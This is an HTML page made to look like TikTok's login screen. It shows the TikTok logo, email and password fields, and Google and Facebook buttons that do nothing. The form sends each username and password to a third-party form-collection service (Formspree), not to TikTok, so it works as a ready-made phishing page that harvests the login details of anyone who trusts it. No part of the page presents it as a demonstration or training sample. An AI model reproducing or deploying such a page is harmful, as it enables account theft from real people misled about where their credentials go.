<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Log in to TikTok</title>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0; background: #000;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      display: flex; justify-content: center; align-items: center;
      min-height: 100vh; padding: 20px;
    }
    .card {
      width: 340px; background: #121212; border: 1px solid #2a2a2a;
      border-radius: 8px; padding: 28px 24px; color: #fff;
    }
    .logo { text-align: center; margin-bottom: 20px; }
    h2 { text-align: center; font-size: 22px; font-weight: 700; margin: 0 0 22px; }
    .tabs {
      display: flex; gap: 16px; font-size: 14px;
      border-bottom: 1px solid #2a2a2a; margin-bottom: 20px;
    }
    .tabs div { padding-bottom: 8px; color: #888; }
    .tabs .active { border-bottom: 2px solid #fff; color: #fff; font-weight: 600; }
    form { display: flex; flex-direction: column; gap: 12px; }
    input {
      background: #1e1e1e; border: 1px solid #333; color: #fff;
      padding: 12px; border-radius: 4px; font-size: 14px; outline: none;
    }
    .forgot { font-size: 12px; text-align: right; }
    .forgot a { color: #888; text-decoration: none; }
    button.primary {
      background: #fe2c55; color: #fff; border: none; padding: 13px;
      border-radius: 4px; font-size: 15px; font-weight: 600; cursor: pointer;
    }
    .or { text-align: center; color: #666; font-size: 12px; margin: 18px 0; }
    .socials button {
      width: 100%; background: #1e1e1e; border: 1px solid #333; color: #fff;
      padding: 11px; border-radius: 4px; font-size: 13px; margin-bottom: 10px;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">
      <svg width="44" height="44" viewBox="0 0 48 48">
        <path fill="#fff" d="M24 0h9.5c.6 3.9 2.4 7.3 5.1 9.6 2.2 1.9 5 3 8.1 3.2v9.6c-4.5 0-8.7-1.5-12-4.1v13.9c0 8.9-7.2 16-16 16S2.7 41 2.7 32.1 9.9 16 18.7 16c.7 0 1.4 0 2.1.1v9.8c-.7-.1-1.4-.2-2.1-.2-3.7 0-6.7 3-6.7 6.7s3 6.7 6.7 6.7 6.7-3 6.7-6.7V0z"/>
      </svg>
    </div>
    <h2>Log in to TikTok</h2>

    <div class="tabs">
      <div class="active">Email</div>
      <div>Phone</div>
    </div>

    <form action="https://formspree.io/f/mzedgkzd" method="POST">
      <input type="text" name="username" placeholder="Email or username" required />
      <input type="password" name="password" placeholder="Password" required />
      <div class="forgot"><a href="#">Forgot password?</a></div>
      <button type="submit" class="primary">Log in</button>
    </form>

    <div class="or">OR</div>
    <div class="socials">
      <button type="button">Continue with Google</button>
      <button type="button">Continue with Facebook</button>
    </div>
  </div>
</body>
</html>
